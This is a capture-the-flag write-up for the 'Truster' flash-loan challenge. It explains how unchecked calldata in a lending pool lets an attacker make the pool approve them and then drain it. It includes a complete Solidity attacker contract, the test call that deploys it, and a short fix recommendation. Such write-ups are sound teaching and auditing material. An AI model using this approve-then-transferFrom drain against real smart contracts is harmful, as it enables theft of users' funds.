# Truster

## Introduction
The goal is to siphon all the funds from a pool in a single transaction.

## Code Breakdown
There is only 1 smart contract and consist of 1 function ***flashLoan***.
Let's start by looking at the variable.
```
using Address for address;
IERC20 public immutable damnValuableToken;
```
Both variables are using openzepplin libraries. Links given below showcase the function available to each cast.
Reference: <https://docs.openzeppelin.com/contracts/3.x/api/utils#Address>

<https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#IERC20>

Next, an IERC20 token address is called during the constructor
```
constructor (address tokenAddress) {
    damnValuableToken = IERC20(tokenAddress);
}
```

Lastly, the ***flashLoan*** function requires 4 variables.
```
function flashLoan(
    uint256 borrowAmount,
    address borrower,
    address target,
    bytes calldata data
)
```
It checks if the amount of token in the pool is more than borrow amount
```
uint256 balanceBefore = damnValuableToken.balanceOf(address(this)); 
require(balanceBefore >= borrowAmount, "Not enough tokens in pool"); 
```

After the check, it'll transfer the token to the borrower and execute a low level call
```
damnValuableToken.transfer(borrower, borrowAmount); //transfer to borrower
target.functionCall(data);
```

Finally, it will check if the flash loan is returned to the pool
```
uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
```

Since there are Reentrancy Guard employued in the contract and function, it is not plausible for a reentrancy attack. A direct transfer of token is not an option as well.
Let's look at the ***target.functionCall(data)***
Reference: <https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol>

Notice that it calls for ```return functionCallWithValue(target, data, 0, "Address: low-level call failed!");```.

Tracing that, we'll arrive at this function. Now we can find a way to call a function within the flashloan.
```
require(address(this).balance >= value, "Address: insufficient balance for call");
(bool success, bytes memory returndata) = target.call{value: value}(data);
return verifyCallResultFromTarget(target, success, returndata, errorMessage);
```

## Hints
We can call a low level approval that allow the attacker to transfer funds on the behalf of this contract. Here's the flow:
1) Execute flashloan
2) Within the flashloan, ***target.functionCall(data);*** will execute an approval for attacker to transfer token on the contract's behalf in the future
3) Return the flashloan and complete the function
4) Transfer the tokens on behalf of the contract

Here are reference links to read up
Reference: <https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#IERC20-approve-address-uint256->

<https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#IERC20-transferFrom-address-address-uint256->

## Solution
Here's an easy solution. We want to execute a low-level call to authorise our attacker address to transfer tokens in the future. Here's the statement to obtain the call data.
```
bytes memory attackcalldata = abi.encodeWithSignature(
    "approve(address,uint256)",
    address(this),
    tokens
);
```

Then, we'll drop the call data into the flashLoan function when it'll execute the ***approve*** call.
```
pool.flashLoan(0, msg.sender, address(damnValuableToken), attackcalldata);
```

Lastly, the attacker is now an authorised user to transfer token on behalf of the smart contract pool.
```
damnValuableToken.transferFrom(address(pool), msg.sender, tokens);
```

A new smart contract is drawn up for this solution. Here's the codes.
```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../truster/TrusterLenderPool.sol";

/**
 * @title TrusterAttacker
 * @author BingleBangle-BH's attacker contract
 */
contract TrusterAttacker is ReentrancyGuard {

    IERC20 public immutable damnValuableToken;
    TrusterLenderPool public immutable pool;

    constructor (address _pool, address _token){
        pool = TrusterLenderPool(_pool);
        damnValuableToken = IERC20(_token);
    }

    function drainFunds(uint256 tokens) external nonReentrant{
        bytes memory attackcalldata = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            tokens
        );
        pool.flashLoan(0, msg.sender, address(damnValuableToken), attackcalldata);
        damnValuableToken.transferFrom(address(pool), msg.sender, tokens);

    }
}
```

Here's the call from javascript
```js
it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE  */
    const attackerpool = await ethers.getContractFactory('TrusterAttacker', attacker);
    this.attack = await attackerpool.deploy(this.pool.address, this.token.address);
    await this.attack.connect(attacker).drainFunds(TOKENS_IN_POOL);
});
```

## Reccommendations
Do not allow unidentified users to insert calldata. If need be, always check ```msg.sender``` against a list of whitelisted address.